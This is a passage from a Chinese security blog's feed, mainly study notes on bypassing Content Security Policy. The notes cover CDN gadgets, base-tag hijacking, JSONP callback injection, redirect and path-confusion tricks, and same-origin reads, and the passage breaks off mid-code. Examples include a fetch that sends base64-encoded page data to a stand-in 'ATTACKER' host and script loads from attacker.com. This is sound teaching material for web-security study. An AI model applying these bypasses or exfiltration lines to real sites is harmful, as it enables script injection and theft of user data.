class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span>;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">open</span> = <span class="keyword">function</span> (<span class="params">method, url, <span class="keyword">async</span></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (url.<span class="title function_">indexOf</span>(<span class="string">&quot;rnd&quot;</span>) != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">debugger</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> open.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p>把原来的API备份一份，然后在把原来的API给覆盖了</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;以前一直以为原型链污染是后端污染一下那些渲染的中间件什么的，看了google ctf那题，发现前端也可以用这种思路&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10317892&quot;&gt;https://ithelp.ithome.com.tw/articles/10317892&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;有几章我跳过了，因为感觉都是些历史漏洞，就不太想再发文章去记录，但是也是很有知道的必要&lt;br&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10317133&quot;&gt;Universal XSS&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://ithelp.ithome.com.tw/articles/10316778&quot;&gt;Mutation XSS&lt;/a&gt;&lt;br&gt;&lt;/p&gt;&lt;/blockquote&gt;</summary>
    
    
    
    <category term="前端安全" scheme="https://kaikaix.github.io/categories/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javascript" scheme="https://kaikaix.github.io/tags/javascript/"/>
    
    <category term="xss" scheme="https://kaikaix.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>前端安全6-CSP绕过（笔记）</title>
    <link href="https://kaikaix.github.io/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/"/>
    <id>https://kaikaix.github.io/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/</id>
    <published>2023-10-01T17:20:04.000Z</published>
    <updated>2023-10-02T05:18:40.272Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>绕过csp的一些方法</p><ul><li><a href="https://ithelp.ithome.com.tw/articles/10316449">https://ithelp.ithome.com.tw/articles/10316449</a><span id="more"></span></li></ul><h1 id="不安全的domain"><a href="#不安全的domain" class="headerlink" title="不安全的domain"></a>不安全的domain</h1><p>有一些三方库存在0day<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/CanardMandarin/csp-bypass</span><br></pre></td></tr></table></figure><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src https://unpkg.com/&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/react@16.7.0/umd/react.production.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/csp-bypass@1.0.2/dist/sval-classic.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">br</span> <span class="attr">csp</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h1 id="通过base标签绕过"><a href="#通过base标签绕过" class="headerlink" title="通过base标签绕过"></a>通过base标签绕过</h1><p>假设加上了nonce，且无法被猜测<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://attacker.com/my.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这样就会无法加载<code>my.js</code><br>但是如果用下面的代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;nonce-abc123&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- xss --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">&quot;https://attacker.com/&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">abc123</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>通过改变base，然后去加载攻击者的<code>app.js</code><br>修复方法就是用上一章里面有的<code>base-uri &#39;none&#39;</code></p><h1 id="JSONP绕过"><a href="#JSONP绕过" class="headerlink" title="JSONP绕过"></a>JSONP绕过</h1><h2 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h2><p>因为同源策略，如果想向其他网站取出数据，通过下面的代码是无法取出数据的<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://example.com/&#x27;</span>)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> <span class="title function_">btoa</span>(data))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>) =&gt;</span> location.<span class="title function_">replace</span>(<span class="string">`http://ATTACKER/?data=<span class="subst">$&#123;data&#125;</span>`</span>))</span><br></pre></td></tr></table></figure><br><img src="/2023/10/02/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A86-CSP%E7%BB%95%E8%BF%87%EF%BC%88%E7%AC%94%E8%AE%B0%EF%BC%89/1.png" alt><br>会爆出上面的错误，但是加载别人的js代码是没问题的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-type: application/json&#x27;</span>);</span><br><span class="line"><span class="comment">//获取回调函数名</span></span><br><span class="line"><span class="variable">$jsoncallback</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_REQUEST</span> [<span class="string">&#x27;jsoncallback&#x27;</span>]);</span><br><span class="line"><span class="comment">//json数据</span></span><br><span class="line"><span class="variable">$json_data</span> = <span class="string">&#x27;[&quot;customername1&quot;,&quot;customername2&quot;]&#x27;</span>;</span><br><span class="line"><span class="comment">//输出jsonp格式的数据</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jsoncallback</span> . <span class="string">&quot;(&quot;</span> . <span class="variable">$json_data</span> . <span class="string">&quot;)&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>别人调用一个函数，函数名是你自己的请求的，然后你这边把函数设计一下就行了<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>JSONP 实例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;divCustomers&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">callbackFunction</span>(<span class="params">result, methodName</span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> html = <span class="string">&#x27;&lt;ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; result.<span class="property">length</span>; i++)</span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        html += <span class="string">&#x27;&lt;li&gt;&#x27;</span> + result[i] + <span class="string">&#x27;&lt;/li&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    html += <span class="string">&#x27;&lt;/ul&gt;&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;divCustomers&#x27;</span>).<span class="property">innerHTML</span> = html;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>这段代码是我从runoob抄下来的，他加了个htmlspecialchars，但是并没有什么卵用，直接绕<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span> <span class="attr">src</span>=<span class="string">&quot;https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=alert(1);callbackFunction&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><br>有一个仓库收集了一些jsonp，可以被绕过<br><a href="https://github.com/zigoo0/JSONBee">https://github.com/zigoo0/JSONBee</a></p><p>所以真正的过滤应该是，只允许<code>a-zA-Z.</code>这些字符<br>但是这样其实也有办法可以绕过<br><a href="https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/">https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/</a><br>参考这个文章，如果某个按钮出现了问题，你可以通过获取他的元素，然后click()<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;a&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(1)&quot;</span>&gt;</span>点击弹窗<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">firstElementChild</span>.<span class="title function_">click</span>()</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>如果是个jsonp，那么就是<br><a href="https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click">https://www.runoob.com/try/ajax/jsonp.php?jsoncallback=document.body.firstElementChild.click</a></p><h1 id="重定向绕过"><a href="#重定向绕过" class="headerlink" title="重定向绕过"></a>重定向绕过</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://localhost https://192.168.3.16/a/b/c/d&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://192.168.3.16/a/test&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost/301.php&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>301.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://192.168.3.16/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>前两个因为csp策略被阻拦了，最后一个是一个允许的，并且是个重定向，但是只能重定向到csp规定的host，他只是不在看path了，但是host还是看的，如果是<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: http://abc.com/test.js&#x27;</span>);</span><br></pre></td></tr></table></figure><br>还是会被拦截</p><h1 id="RPO绕过"><a href="#RPO绕过" class="headerlink" title="RPO绕过"></a>RPO绕过</h1><p>如果CSP是允许<code>https://example.com/script/abc/</code><br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src http://127.0.0.1/script/abc/&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;pragma&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;Cache-Control&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;no-cache, must-revalidate&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;expires&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">userContent</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.0.1/script/abc/..%2f..%2ftest.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><br>那么上面的代码就可以绕过，但是这是要取决于后端服务器的处理，nginx和nodejs是可以的，其他没测试过，到时候可以看看</p><h1 id="通源类型的绕过"><a href="#通源类型的绕过" class="headerlink" title="通源类型的绕过"></a>通源类型的绕过</h1><p>如果要获取<code>http://127.0.0.1/ycb.php</code>中的内容，但是<code>ycb.php</code>有csp保护，如下<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- A页面 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">id</span>=<span class="string">&quot;flag&quot;</span>&gt;</span>flag&#123;0xffff&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure><br>这时候该网站的另一个页面存在xss，并且没有CSP的保护（或者可以绕过），就可以通过很多方法去获得这个flag</p><ol><li><p>iframe</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> iframe = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">iframe.<span class="property">src</span>=<span class="string">&quot;http://127.0.0.1/ycb.php&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(iframe);</span></span><br><span class="line"><span class="language-javascript"><span class="built_in">setTimeout</span>(<span class="function">()=&gt;</span><span class="title function_">alert</span>(iframe.<span class="property">contentWindow</span>.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerHTML</span>),<span class="number">1000</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>fetch</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>).<span class="title function_">then</span>(<span class="function">(<span class="params">response</span>) =&gt;</span> response.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function">(<span class="params">data</span>)=&gt;</span><span class="title function_">alert</span>(data))</span><br></pre></td></tr></table></figure></li><li><p>window.open</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ycb = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://127.0.0.1/ycb.php&#x27;</span>)</span><br><span class="line">ycb.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">alert</span>(ycb.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;flag&#x27;</span>).<span class="property">innerText</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h1 id="其他种类的绕过"><a href="#其他种类的绕过" class="headerlink" title="其他种类的绕过"></a>其他种类的绕过</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;none&#x27;; script-src &#x27;unsafe-inline&#x27;;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// any JavaScript code</span></span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>因为<code>default-src &#39;none&#39;</code>的原因，<code>connect-src</code>也被设为了<code>&#39;none&#39;</code>，这时候就没法使用fetch了，那么还有什么办法</p><ol><li><p>跳转</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span 